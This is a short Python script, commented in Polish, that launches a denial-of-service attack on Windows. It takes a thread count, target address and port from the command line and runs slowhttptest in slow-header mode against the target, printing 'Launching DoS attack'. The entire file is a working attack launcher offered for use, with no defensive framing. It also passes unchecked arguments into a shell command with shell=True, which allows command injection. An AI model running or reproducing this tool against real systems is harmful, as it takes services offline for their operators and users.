import sys
import subprocess
import platform

if platform.system() != "Windows":
    print("This script is only compatible with Windows.")
    sys.exit(1)

if len(sys.argv) != 4:
    print("Usage: python script.py <threats> <target_address> <target_port>")
    sys.exit(1)

threats = sys.argv[1]
target_address = sys.argv[2]
target_port = sys.argv[3]

print(f"Launching DoS attack with {threats} threads on {target_address}:{target_port}")

# Komenda do wykonania ataku DoS w systemie Windows
command = f"start cmd /c \"slowhttptest -c {threats} -H -g -o NUL -i 10 -r 200 -t GET -u http://{target_address}:{target_port}/\""

# Wykonanie komendy systemowej
subprocess.run(command, shell=True)
